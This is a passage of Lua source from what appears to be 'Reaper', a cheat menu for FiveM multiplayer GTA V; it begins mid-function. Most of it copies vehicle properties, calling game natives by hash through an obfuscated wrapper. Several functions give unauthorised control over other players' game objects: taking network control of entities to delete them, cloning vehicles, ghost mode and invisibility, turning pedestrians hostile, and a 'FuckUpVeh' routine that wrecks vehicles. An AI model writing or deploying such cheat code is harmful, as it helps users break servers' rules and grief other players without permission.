            tablem.wheels            = __REAPER1__.N.ReaperInvoke(0xB3ED1BFB4BE636DC, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.windowTint        = __REAPER1__.N.ReaperInvoke(0x0EE21293DAD47C95, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.xenonColor        = __REAPER1__.N.ReaperInvoke(0x3DFF319A831E0CDB, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.neonEnabled       = { __REAPER1__.N.ReaperInvoke(0x8C4B92553E4766A5, p1, 0, Citizen.ReturnResultAnyway()), __REAPER1__.N.ReaperInvoke(0x8C4B92553E4766A5, p1, 1, Citizen.ReturnResultAnyway()), __REAPER1__.N.ReaperInvoke(0x8C4B92553E4766A5, p1, 2, Citizen.ReturnResultAnyway()), __REAPER1__.N.ReaperInvoke(0x8C4B92553E4766A5, p1, 3, Citizen.ReturnResultAnyway())}
            tablem.neonColor         = table.pack(__REAPER1__.N.ReaperInvoke(0x7619EEE8C886757F, p1, Citizen.PointerValueInt(), Citizen.PointerValueInt(), Citizen.PointerValueInt()))
            tablem.extras            = extras
            tablem.tyreSmokeColor    = table.pack(__REAPER1__.N.ReaperInvoke(0xB635392A4938B3C3, p1, Citizen.PointerValueInt(), Citizen.PointerValueInt(), Citizen.PointerValueInt()))
            tablem.modSpoilers       = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modFrontBumper    = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modRearBumper     = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modSideSkirt      = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modExhaust        = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 4, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modFrame          = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 5, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modGrille         = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modHood           = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 7, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modFender         = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 8, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modRightFender    = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 9, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modRoof           = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 10, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modEngine         = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 11, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modBrakes         = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 12, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modTransmission   = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 13, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modHorns          = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 14, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modSuspension     = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 15, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modArmor          = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 16, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modTurbo          = __REAPER1__.N.ReaperInvoke(0x84B233A8C8FC8AE7, p1, 18, Citizen.ReturnResultAnyway())
            tablem.modSmokeEnabled   = __REAPER1__.N.ReaperInvoke(0x84B233A8C8FC8AE7, p1, 20, Citizen.ReturnResultAnyway())
            tablem.modXenon          = __REAPER1__.N.ReaperInvoke(0x84B233A8C8FC8AE7, p1, 22, Citizen.ReturnResultAnyway())
            tablem.modFrontWheels    = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 23, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modBackWheels     = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 24, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modPlateHolder    = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 25, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modVanityPlate    = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 26, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modTrimA          = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 27, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modOrnaments      = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 28, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modDashboard      = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 29, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modDial           = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 30, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modDoorSpeaker    = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 31, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modSeats          = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 32, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modSteeringWheel  = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 33, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modShifterLeavers = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 34, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modAPlate         = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 35, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modSpeakers       = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 36, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modTrunk          = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 37, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modHydrolic       = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 38, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modEngineBlock    = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 39, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modAirFilter      = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 40, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modStruts         = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 41, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modArchCover      = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 42, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modAerials        = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 43, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modTrimB          = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 44, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modTank           = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 45, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modWindows        = __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, 46, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.modLivery         = __REAPER1__.N.ReaperInvoke(0x2BB9230590DA5E8A, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())

            return tablem
        end end
    function __REAPER1__.N.SetVehProperties(p1, p2)
        if __REAPER1__.N.ReaperInvoke(0x7239B21A38F536BA, p1, Citizen.ReturnResultAnyway()) then
            local colorPrimary, colorSecondary = GetVehicleColours(p1)
            local pearlescentColor, wheelColor = GetVehicleExtraColours(p1)
            __REAPER1__.N.ReaperInvoke(0x1F2AA07F00B3217A, p1, 0)
        
            if p2.extras then
                for extraId,enabled in pairs(p2.extras) do
                    if enabled then
                        __REAPER1__.N.ReaperInvoke(0x7EE3A3C5E4A40CC9, p1, tonumber(extraId), 0)
                    else
                        __REAPER1__.N.ReaperInvoke(0x7EE3A3C5E4A40CC9, p1, tonumber(extraId), 1)
                    end
                end
            end

            if p2.plate then __REAPER1__.N.ReaperInvoke(0x95A88F0B409CDA47, p1, p2.plate) end
            if p2.plateIndex then __REAPER1__.N.ReaperInvoke(0x9088EB5A43FFB0A1, p1, p2.plateIndex) end
            if p2.bodyHealth then __REAPER1__.N.ReaperInvoke(0xB77D05AC8C78AADB, p1, p2.bodyHealth + 0.0) end
            if p2.engineHealth then __REAPER1__.N.ReaperInvoke(0x45F6D8EEF34ABEF1, p1, p2.engineHealth + 0.0) end
            if p2.tankHealth then __REAPER1__.N.ReaperInvoke(0x70DB57649FA8D0D8, p1, p2.tankHealth + 0.0) end
            if p2.fuelLevel then __REAPER1__.N.ReaperInvoke(0xba970511, p1, p2.fuelLevel + 0.0) end
            if p2.dirtLevel then __REAPER1__.N.ReaperInvoke(0x79D3B596FE44EE8B, p1, p2.dirtLevel + 0.0) end
            if p2.color1 then __REAPER1__.N.ReaperInvoke(0x4F1D4BE3A7F24601, p1, p2.color1, colorSecondary) end
            if p2.color2 then __REAPER1__.N.ReaperInvoke(0x4F1D4BE3A7F24601, p1, p2.color1 or colorPrimary, p2.color2) end
            if p2.pearlescentColor then __REAPER1__.N.ReaperInvoke(0x2036F561ADD12E33, p1, p2.pearlescentColor, wheelColor) end
            if p2.wheelColor then __REAPER1__.N.ReaperInvoke(0x2036F561ADD12E33, p1, p2.pearlescentColor or pearlescentColor, p2.wheelColor) end
            if p2.wheels then __REAPER1__.N.ReaperInvoke(0x487EB21CC7295BA1, p1, p2.wheels) end
            if p2.windowTint then __REAPER1__.N.ReaperInvoke(0x57C51E6BAD752696, p1, p2.windowTint) end
            if p2.neonEnabled then __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 0, p2.neonEnabled[1]) __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 1, p2.neonEnabled[2]) __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 2, p2.neonEnabled[3]) __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, 3, p2.neonEnabled[4]) end
            if p2.neonColor then __REAPER1__.N.ReaperInvoke(0x8E0A582209A62695, p1, p2.neonColor[1], p2.neonColor[2], p2.neonColor[3]) end
            if p2.xenonColor then __REAPER1__.N.ReaperInvoke(0xE41033B25D003A07, p1, p2.xenonColor) end
            if p2.modSmokeEnabled then __REAPER1__.N.ReaperInvoke(0x2A1F4F37F95BAD08, p1, 20, true) end
            if p2.modTurbo then __REAPER1__.N.ReaperInvoke(0x2A1F4F37F95BAD08, p1,  18, p2.modTurbo) end
            if p2.modXenon then __REAPER1__.N.ReaperInvoke(0x2A1F4F37F95BAD08, p1,  22, p2.modXenon) end
            if p2.tyreSmokeColor then __REAPER1__.N.ReaperInvoke(0xB5BA80F839791C0F, p1, p2.tyreSmokeColor[1], p2.tyreSmokeColor[2], p2.tyreSmokeColor[3]) end
            if p2.modSpoilers then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 0, p2.modSpoilers, false) end
            if p2.modFrontBumper then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 1, p2.modFrontBumper, false) end
            if p2.modRearBumper then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 2, p2.modRearBumper, false) end
            if p2.modSideSkirt then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 3, p2.modSideSkirt, false) end
            if p2.modExhaust then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 4, p2.modExhaust, false) end
            if p2.modFrame then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 5, p2.modFrame, false) end
            if p2.modGrille then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 6, p2.modGrille, false) end
            if p2.modHood then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 7, p2.modHood, false) end
            if p2.modFender then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 8, p2.modFender, false) end
            if p2.modRightFender then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 9, p2.modRightFender, false) end
            if p2.modRoof then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 10, p2.modRoof, false) end
            if p2.modEngine then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 11, p2.modEngine, false) end
            if p2.modBrakes then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 12, p2.modBrakes, false) end
            if p2.modTransmission then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 13, p2.modTransmission, false) end
            if p2.modHorns then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 14, p2.modHorns, false) end
            if p2.modSuspension then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 15, p2.modSuspension, false) end
            if p2.modArmor then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 16, p2.modArmor, false) end
            if p2.modFrontWheels then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 23, p2.modFrontWheels, false) end
            if p2.modBackWheels then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 24, p2.modBackWheels, false) end
            if p2.modPlateHolder then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 25, p2.modPlateHolder, false) end
            if p2.modVanityPlate then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 26, p2.modVanityPlate, false) end
            if p2.modTrimA then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 27, p2.modTrimA, false) end
            if p2.modOrnaments then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 28, p2.modOrnaments, false) end
            if p2.modDashboard then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 29, p2.modDashboard, false) end
            if p2.modDial then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 30, p2.modDial, false) end
            if p2.modDoorSpeaker then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 31, p2.modDoorSpeaker, false) end
            if p2.modSeats then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 32, p2.modSeats, false) end
            if p2.modSteeringWheel then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 33, p2.modSteeringWheel, false) end
            if p2.modShifterLeavers then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 34, p2.modShifterLeavers, false) end
            if p2.modAPlate then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 35, p2.modAPlate, false) end
            if p2.modSpeakers then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 36, p2.modSpeakers, false) end
            if p2.modTrunk then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 37, p2.modTrunk, false) end
            if p2.modHydrolic then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 38, p2.modHydrolic, false) end
            if p2.modEngineBlock then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 39, p2.modEngineBlock, false) end
            if p2.modAirFilter then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 40, p2.modAirFilter, false) end
            if p2.modStruts then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 41, p2.modStruts, false) end
            if p2.modArchCover then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 42, p2.modArchCover, false) end
            if p2.modAerials then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 43, p2.modAerials, false) end
            if p2.modTrimB then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 44, p2.modTrimB, false) end
            if p2.modTank then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 45, p2.modTank, false) end
            if p2.modWindows then __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 46, p2.modWindows, false) end
        
            if p2.modLivery then
                __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, 48, p2.modLivery, false)
                __REAPER1__.N.ReaperInvoke(0x60BF608F1B8CD1B6, p1, p2.modLivery)
            end
        end end
    function __REAPER1__.N.CloneVehicle(p1,p2,p3,p4,p5)
        __REAPER25__(function()
            local model = __REAPER1__.N.ReaperInvoke(0x9F47B058362C84B5, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            if __REAPER1__.F.RequestEntity(model) then
                local props = __REAPER1__.N.GetVehProperties(p1)
                local veh = __REAPER1__.N.ReaperInvoke(0xAF35D0D2583051B0, model, p2, p3, p4, p5, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
                __REAPER1__.N.SetVehProperties(veh, props)
            end
        end) end
    function __REAPER1__.N.SetPedAngry(p1)
        __REAPER1__.N.ReaperInvoke(0x3C606747B23E497B, p1, 2)
        __REAPER1__.N.ReaperInvoke(0x4D9CA1009AFBD057, p1, 2)
        __REAPER1__.N.ReaperInvoke(0xC7622C0D36B2FDA8, p1, 2)
        __REAPER1__.N.ReaperInvoke(0xB3B1CB349FF9C75D, p1, true, false)
        __REAPER1__.N.ReaperInvoke(0xF166E48407BAC484, p1, __REAPER1__.F.ClosestEntity('ped', true), 0, 16) end
    function __REAPER1__.N.PlaySound(p0,p1,p2,p3,p4)
        if p0 == 'def' and __REAPER1__.A['settings_defaultsounds'].func or p0 == 'bind' and __REAPER1__.A['settings_bindingsounds'].func or not p0 then
            return __REAPER1__.N.ReaperInvoke(0x67C540AA08E4A6F5, p1, p2, p3, p4)
        end end
    function __REAPER1__.N.IsDisabledControlJustPressed(p1,p2,p0)
        if not __REAPER1__.M.TextboxWriting or p0 then
            return __REAPER1__.N.ReaperInvoke(0x91AEF906BCA88877, p1, p2, Citizen.ReturnResultAnyway())
        end
        return false end
    function __REAPER1__.N.IsDisabledControlJustReleased(p1,p2,p0)
        if not __REAPER1__.M.TextboxWriting or p0 then
            return __REAPER1__.N.ReaperInvoke(0x305C8DCD79DA8B0F, p1, p2, Citizen.ReturnResultAnyway())
        end
        return false end
    function __REAPER1__.N.IsDisabledControlPressed(p1,p2,p0)
        if not __REAPER1__.M.TextboxWriting or p0 then
            return __REAPER1__.N.ReaperInvoke(0xE2587F8CBBD87B1D, p1, p2, Citizen.ReturnResultAnyway())
        end
        return false end
    function __REAPER1__.N.IsDisabledControlReleased(p1,p2,p0)
        if not __REAPER1__.M.TextboxWriting or p0 then
            return __REAPER1__.N.ReaperInvoke(0xFB6C4072E9A32E92, p1, p2, Citizen.ReturnResultAnyway())
        end
        return false end
    function __REAPER1__.N.RespawnSelf(p1,p2,p3,p4,p5)
        __REAPER1__.N.ReaperInvoke(0x239A3351AC1DA385, p1, p2, p3, p4, false, false, false)
        __REAPER1__.N.ReaperInvoke(0xEA23C49EAA83ACFB, p2, p3, p4, p5, true, false)
        __REAPER1__.N.ReaperInvoke(0x8FE22675A5A45817, p1)
        __REAPER1__.N.ReaperInvoke(0x9FA4664CF62E47E8, p1) end
    function __REAPER1__.N.SecureInvisible(p1,p2)
        if p2 then
            __REAPER1__.N.ReaperInvoke(0xDE564951F95E09ED, p1, false, false)
        else
            __REAPER1__.N.ReaperInvoke(0x1F4ED342ACEFE62D, p1, 0)
        end end
    function __REAPER1__.N.DeleteEntity(p1,p2)
        if p2 then
            return __REAPER1__.N.ReaperInvoke(0xAE3CBE5BF394C9C9, Citizen.PointerValueIntInitialized(p1))
        else
            __REAPER25__(function()
                if __REAPER1__.F.NetControl(p1) then
                    return __REAPER1__.N.ReaperInvoke(0xAE3CBE5BF394C9C9, Citizen.PointerValueIntInitialized(p1))
                end
            end)
        end end
    function __REAPER1__.N.GhostMode(p1,p2)
        __REAPER1__.N.ReaperInvoke(0x1913FE4CBF41C463, p1, 60, not p2)
        __REAPER1__.N.ReaperInvoke(0x1913FE4CBF41C463, p1, 61, not p2)
        __REAPER1__.N.ReaperInvoke(0x1913FE4CBF41C463, p1, 104, not p2)
        __REAPER1__.N.ReaperInvoke(0x1913FE4CBF41C463, p1, 276, not p2)
        __REAPER1__.N.ReaperInvoke(0x1913FE4CBF41C463, p1, 76, p2)
        if p2 then __REAPER1__.N.ReaperInvoke(0x364DF566EC833DE2, p1, 0.0000000000000000000000000000000000001) end end
    function __REAPER1__.N.SetVisionClear()
        __REAPER1__.N.ReaperInvoke(0x0F07E7745A236711)
        __REAPER1__.N.ReaperInvoke(0x7E08924259E08CE0, false)
        __REAPER1__.N.ReaperInvoke(0x18F621F7A5B1F85D, false)
        __REAPER1__.N.ReaperInvoke(0x92CCC17A7A2285DA) end
    function __REAPER1__.N.DoParticle(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13)
        __REAPER25__(function()
            local timer = 0
            __REAPER1__.N.ReaperInvoke(0xB80D8756B4668AB6, tostring(p1))
            while not __REAPER1__.N.ReaperInvoke(0x8702416E512EC454, tostring(p1), Citizen.ReturnResultAnyway()) do
                __REAPER26__(100)
                timer = timer + 1
                if timer > 50 then
                    __REAPER1__.N.ReaperInvoke(0x5F61EBBE1A00F96D, tostring(p1))
                    return
                end
            end
            __REAPER1__.N.ReaperInvoke(0x6C38AF3693A69A91, tostring(p1))
            __REAPER1__.N.ReaperInvoke(0xF56B8137DF10135D, tostring(p2), p3, p4, p5, p7, p8, p9, p6, p10, p11, p12, Citizen.ReturnResultAnyway())
            __REAPER1__.N.ReaperInvoke(0x5F61EBBE1A00F96D, tostring(p1))
        end) end
    function __REAPER1__.N.CreateScaleform(p1,p2,p3,p4)
        __REAPER1__.N.ReaperInvoke(0xF6E48914C7A8694E, __REAPER1__.V.Scaleform, "SET_DATA_SLOT", Citizen.ReturnResultAnyway())
        __REAPER1__.N.ReaperInvoke(0xC3D0841A0CC546A6, p1)
        __REAPER1__.N.ReaperInvoke(0xE83A3E3557A56640, p2)
        if p4 then __REAPER1__.N.ReaperInvoke(0xE83A3E3557A56640, p4) end
        __REAPER1__.N.ReaperInvoke(0xBA7148484BD90365, p3)
        __REAPER1__.N.ReaperInvoke(0xC6796A8FFA375E53) end
    function __REAPER1__.N.RevivePed(p1)
        __REAPER1__.N.ReaperInvoke(0x239A3351AC1DA385, p1, __REAPER1__.N.ReaperInvoke(0x3FEF770D40960D5A, p1, false, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()), false, false, false)
        __REAPER1__.N.ReaperInvoke(0x71BC8E838B9C6035, p1)
        __REAPER1__.N.ReaperInvoke(0x6B76DC1F3AE6E6A3, p1, 200)
        __REAPER1__.N.ReaperInvoke(0xAAA34F8A7CB32098, p1)
        __REAPER1__.N.ReaperInvoke(0x1A9205C1B9EE827F, p1, true, true) end
    function __REAPER1__.N.FuckUpVeh(p1)
        __REAPER1__.N.ReaperInvoke(0xB77D05AC8C78AADB, p1, -3000)
        __REAPER1__.N.ReaperInvoke(0x45F6D8EEF34ABEF1, p1, 0.0)
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_rf', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x9E5B5E4D2CCD2259, p1, 0, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_lf', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x9E5B5E4D2CCD2259, p1, 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())	end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_rr', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x9E5B5E4D2CCD2259, p1, 2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())	end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_lr', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x9E5B5E4D2CCD2259, p1, 3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())	end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_lm', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x9E5B5E4D2CCD2259, p1, 4, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())	end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'window_rm', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x9E5B5E4D2CCD2259, p1, 5, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())	end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'windscreen', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x9E5B5E4D2CCD2259, p1, 6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'windscreen_r', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0x9E5B5E4D2CCD2259, p1, 7, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_lf', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xEC6A202EE4960385, p1, 0, true, 1000.0) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_rf', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xEC6A202EE4960385, p1, 1, true, 1000.0) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_lm', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xEC6A202EE4960385, p1, 2, true, 1000.0) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_rm', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xEC6A202EE4960385, p1, 3, true, 1000.0) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_lr', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xEC6A202EE4960385, p1, 4, true, 1000.0) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'wheel_rr', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xEC6A202EE4960385, p1, 5, true, 1000.0) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'gear_door_fr', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xD4D4F6A4AB575A33, p1, 0, false) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'gear_door_fl', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xD4D4F6A4AB575A33, p1, 1, false) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'gear_door_rr', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xD4D4F6A4AB575A33, p1, 2, false) end
        if __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, 'gear_door_rf', Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) then __REAPER1__.N.ReaperInvoke(0xD4D4F6A4AB575A33, p1, 3, false) end
